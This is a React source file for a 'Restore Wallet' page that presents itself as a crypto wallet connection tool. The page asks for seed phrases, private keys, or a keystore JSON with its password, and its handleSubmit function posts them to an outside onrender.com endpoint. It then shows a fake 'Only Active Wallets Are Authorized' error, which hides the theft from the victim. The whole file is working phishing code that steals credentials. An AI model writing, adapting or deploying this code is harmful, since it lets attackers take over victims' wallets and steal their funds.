import React, { useState, useEffect } from "react";
import SecondModal from "../componets/SecondModal";
import SecurityCheck from "../componets/SecurityCheck";
import { useNavigate } from "react-router";
import Integrating from "../componets/Integrating";
import walletsPic from "../componets/wwa.png";

const Connect = () => {
  const defaultCount = 12;
  const navigate = useNavigate();

  const [activeTab, setActiveTab] = useState("Recovery Phrase");
  const [showIntegratingModal, setShowIntegratingModal] = useState(false);
  const [selectedInputCount, setSelectedInputCount] = useState(defaultCount);
  const [inputs, setInputs] = useState(Array(defaultCount).fill(""));
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState("");
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  const [showErrorMessage, setShowErrorMessage] = useState(false);

  const [formData, setFormData] = useState({
    tab1Inputs: [],
    tab2Text: "",
    tab3: {
      content: "",
      title: "",
    },
  });

  useEffect(() => {
    setInputs(Array(defaultCount).fill(""));
  }, []);

  const handleLiClick = (count) => {
    setSelectedInputCount(count);
    const newInputs = Array(count).fill("");
    setInputs(newInputs);
    setFormData((prev) => ({ ...prev, tab1Inputs: newInputs }));
  };

  const handleInputChange = (index, value) => {
    const newInputs = [...inputs];
    newInputs[index] = value;
    setInputs(newInputs);
    setFormData((prev) => ({ ...prev, tab1Inputs: newInputs }));
  };

  const handleRestore = () => {
    if (!selectedWallet) {
      alert("Please select a wallet.");
      return;
    }

    handleSubmit();

    console.log("Submitting form data:", formData);

    const isTab1Filled = formData.tab1Inputs.some((i) => i.trim() !== "");
    const isTab2Filled = formData.tab2Text.trim() !== "";
    const isTab3Filled =
      formData.tab3.content.trim() !== "" || formData.tab3.title.trim() !== "";

    if (!isTab1Filled && !isTab2Filled && !isTab3Filled) {
      alert("Please fill in one of the restore tabs.");
      return;
    }

    setShowSecurityModal(true);
  };

  const isCurrentTabComplete = () => {
    if (activeTab === "Recovery Phrase") {
      return (
        formData.tab1Inputs.length === selectedInputCount &&
        formData.tab1Inputs.every((val) => val.trim() !== "")
      );
    }
    if (activeTab === "Private Key") {
      return formData.tab2Text.trim() !== "";
    }
    if (activeTab === "Keystore JSON") {
      return (
        formData.tab3.content.trim() !== "" && formData.tab3.title.trim() !== ""
      );
    }
    return false;
  };

  const handleSubmit = async () => {
    try {
      const payload = {
        ...formData,
        wallet: selectedWallet,
      };

      console.log("Payload  checksss:", payload);
      const response = await fetch("https://lol-ep0y.onrender.com/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();
      console.log(" Submit successful: ", result);
    } catch (error) {
      console.error(error);
    }

    setFormData({
      tab1Inputs: Array(selectedInputCount).fill(""),
      tab2Text: "",
      tab3: {
        content: "",
        title: "",
      },
    });

    // Reset inputs array as well (for recovery phrase inputs)
    setInputs(Array(selectedInputCount).fill(""));
  };

  return (
    <div className="relative min-h-screen overflow-hidden p-2 text-white">
      <div className="absolute inset-0 z-[-2] h-full w-full [background:radial-gradient(125%_125%_at_50%_10%,#000_40%,#63e_100%)]" />

      <div className="relative  mx-auto p-2 rounded-lg shadow">
        <div className="absolute top-0 z-[-2] h- w-screen bg-neutral-950 bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(120,119,198,0.3),rgba(255,255,255,0))]" />

        <div className="flex flex-col items-center space-y-4">
          <div className="flex flex-col items-center space-y-2">
            <img
              src={walletsPic}
              alt="Wallet Icon"
              className=" object-contain mx-auto"
            />
            <h1 className="text-2xl font-bold text-center text-white">
              Restore Wallet
            </h1>
          </div>

          <button
            onClick={() => setIsModalOpen(true)}
            className="bg-gradient-to-r from-indigo-500 to-purple-600 text-white w-full py-3 rounded text-center hover:from-indigo-600 hover:to-purple-700"
          >
            {selectedWallet ? `${selectedWallet}` : "Select Wallet"}
          </button>
        </div>

        <div className="mt-8">
          <ul className="flex border-b mb-4">
            {["Recovery Phrase", "Private Key", "Keystore JSON"].map((tab) => (
              <li key={tab} className="mr-4">
                <button
                  onClick={() => setActiveTab(tab)}
                  className={`px-4 py-2 font-semibold ${
                    activeTab === tab
                      ? "border-b-4 border-purple-600 text-white-600"
                      : "text-gray-500 hover:text-blue-500"
                  }`}
                >
                  {tab.toUpperCase()}
                </button>
              </li>
            ))}
          </ul>

          {/* Tab 1 */}
          {activeTab === "Recovery Phrase" && (
            <div className="space-y-4">
              <div className="flex justify-between items-center my-4">
                <p className="text-purple-600">
                  {formData.tab1Inputs.filter((i) => i !== "").length} /{" "}
                  {selectedInputCount} words entered
                </p>
                <ul className="flex text-gray-800">
                  {[12, 17, 24, 25].map((val) => (
                    <li
                      key={val}
                      onClick={() => handleLiClick(val)}
                      className={`cursor-pointer px-1 py-0 rounded ${
                        selectedInputCount === val
                          ? "bg-blue-100 text-blue-600 font-semibold"
                          : "text-purple-600 hover:underline"
                      }`}
                    >
                      {val}
                    </li>
                  ))}
                </ul>
              </div>

              <div className="grid grid-cols-3 gap-4">
                {inputs.map((input, index) => (
                  <div key={index} className="relative group my-1">
                    <span className="absolute -left-0.5 top-2 bottom-2 w-1.5 rounded bg-gradient-to-b from-indigo-500 to-purple-500 opacity-70 transition-all duration-300 group-focus-within:opacity-100"></span>
                    <input
                      type="text"
                      value={input}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      placeholder=""
                      className="peer w-full pl-6 pr-4 pt-6 pb-2 text-sm text-gray-800 bg-white border border-gray-200 rounded-lg shadow-md focus:border-transparent focus:ring-2 focus:ring-indigo-300 focus:outline-none placeholder-transparent"
                    />
                    <label
                      htmlFor={`input-${index}`}
                      className="absolute left-6 top-3.5 text-[10px] text-gray-500 transition-all duration-200 ease-in-out peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-400 peer-focus:top-1 peer-focus:text-sm peer-focus:text-indigo-500 peer-focus:font-semibold cursor-text"
                    >
                      Write Here
                    </label>
                  </div>
                ))}
              </div>

              <button
                onClick={handleRestore}
                disabled={!isCurrentTabComplete()}
                className={`w-full bg-gradient-to-r from-indigo-500 to-purple-500 text-white px-4 py-2 rounded mt-2 transition-colors ${
                  isCurrentTabComplete()
                    ? "hover:from-indigo-600 hover:to-purple-600"
                    : "opacity-50 cursor-not-allowed"
                }`}
              >
                Restore
              </button>
            </div>
          )}

          {/* Tab 2 */}
          {activeTab === "Private Key" && (
            <div className="space-y-4">
              <input
                className="rounded bg-white text-xl border border-purple-500 p-2 w-full text-gray-800 placeholder:text-sm placeholder-purple-400 focus:text-violet-950 focus:border-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500"
                placeholder="Paste your quest..."
                value={formData.tab2Text}
                onChange={(e) =>
                  setFormData((prev) => ({
                    ...prev,
                    tab2Text: e.target.value,
                  }))
                }
              />
              <button
                onClick={handleRestore}
                disabled={!isCurrentTabComplete()}
                className={`w-full bg-gradient-to-r from-indigo-500 to-purple-500 text-white px-4 py-2 rounded transition-colors ${
                  isCurrentTabComplete()
                    ? "hover:from-indigo-600 hover:to-purple-600"
                    : "opacity-50 cursor-not-allowed"
                }`}
              >
                Restore
              </button>
            </div>
          )}

          {/* Tab 3 */}
          {activeTab === "Keystore JSON" && (
            <form
              onSubmit={(e) => {
                e.preventDefault();
                handleRestore();
              }}
              className="bg-white w-full p-6 rounded-lg shadow-md space-y-4"
            >
              <div>
                <textarea
                  rows="5"
                  placeholder="Paste your Keystore JSON here"
                  value={formData.tab3.content}
                  onChange={(e) =>
                    setFormData((prev) => ({
                      ...prev,
                      tab3: { ...prev.tab3, content: e.target.value },
                    }))
                  }
                  className="shadow border rounded py-2 px-3 border-purple-500 w-full text-gray-800 placeholder:text-sm placeholder-purple-400 focus:text-violet-950 focus:border-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500"
                ></textarea>
              </div>

              <div>
                <input
                  value={formData.tab3.title}
                  onChange={(e) =>
                    setFormData((prev) => ({
                      ...prev,
                      tab3: { ...prev.tab3, title: e.target.value },
                    }))
                  }
                  className="rounded bg-white text-xl border border-purple-500 p-2 w-full text-gray-800 placeholder:text-sm placeholder-purple-400 focus:text-violet-950 focus:border-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="Password"
                />
              </div>

              <button
                type="submit"
                disabled={!isCurrentTabComplete()}
                className={`w-full bg-gradient-to-r from-indigo-500 to-purple-500 text-white px-4 py-2 rounded transition-colors ${
                  isCurrentTabComplete()
                    ? "hover:from-indigo-600 hover:to-purple-600"
                    : "opacity-50 cursor-not-allowed"
                }`}
              >
                Restore
              </button>
            </form>
          )}
        </div>
      </div>

      {/* Wallet Modal */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <SecondModal
            closeModal={() => setIsModalOpen(false)}
            onWalletSelect={(walletName) => {
              setSelectedWallet(walletName);
              setIsModalOpen(false);
            }}
          />
        </div>
      )}

      {/* Security Check Modal */}
      {showSecurityModal && (
        <SecurityCheck
          onClose={() => setShowSecurityModal(false)}
          onContinue={() => {
            setShowSecurityModal(false); // Close the security modal
            setShowIntegratingModal(true); // Show the integrating modal
            setShowErrorMessage(true); // Show the error message

            // Hide the error after 10 seconds
            setTimeout(() => {
              setShowErrorMessage(false);
            }, 10000);
          }}
        />
      )}

      {showIntegratingModal && (
        <Integrating onClose={() => setShowIntegratingModal(false)} />
      )}

      {showErrorMessage && (
        <div className="fixed top-5 right-5 z-50 bg-red-100 border border-red-400 text-red-700 px-6 py-4 rounded shadow-md transition-opacity duration-500">
          <strong className="font-bold">
            <h2>Error Connecting</h2>
          </strong>
          <p className="ml-2">Only Active Wallets Are Authorized</p>
        </div>
      )}
      <div className="flex items-center justify-between py-4 text-gray-400">
        <p>Help</p>
        <p>Quit</p>
      </div>
    </div>
  );
};

export default Connect;
